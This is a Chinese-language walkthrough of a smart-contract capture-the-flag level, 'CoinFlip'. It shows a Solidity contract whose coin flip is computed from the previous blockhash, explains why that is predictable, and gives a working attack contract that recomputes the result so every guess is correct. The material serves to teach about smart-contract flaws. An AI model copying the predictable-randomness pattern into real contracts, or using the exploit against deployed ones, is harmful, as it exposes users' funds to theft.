# 3. CoinFlip

### 原题
```
这是一个掷硬币的游戏，你需要连续的猜对结果。
完成这一关，你需要通过你的超能力来连续猜对十次。

``` 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
### 分析
不要被“连续10次猜中”这个要求吓到。平时我们玩硬币猜正反面，确实基本不大可能会连续10次可以都猜对。玩都是天意。我们看看代码，里面把计算方法都打明牌了，都是确定性的计算，也没有随机，这哪叫猜啊，这就是明牌斗地主。我们只要把他的计算过程，自己计算一遍，给出结果再给他，这样就可以把把都猜中了。没有随机数，计算结果可以复制的。就像小朋友捉迷藏，自己站在最明显的地方蒙着自己的眼睛叫人来找他！话不多说，下面就是攻击代码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface  ICoinFlip {
    function flip(bool _guess) external  returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip public coinflip;
    // 同样的factor
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor (address _coinflip) {
        coinflip = ICoinFlip(_coinflip);
    }

    function attack() public {
      // 同样的区块号计算
       uint256 blockValue = uint256(blockhash(block.number -1 ));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        // 必然返回同样的结果
        // 做的更完善的，可以自动猜，我为了演示，直接手动，偷懒
        coinflip.flip(side);
    }
}
```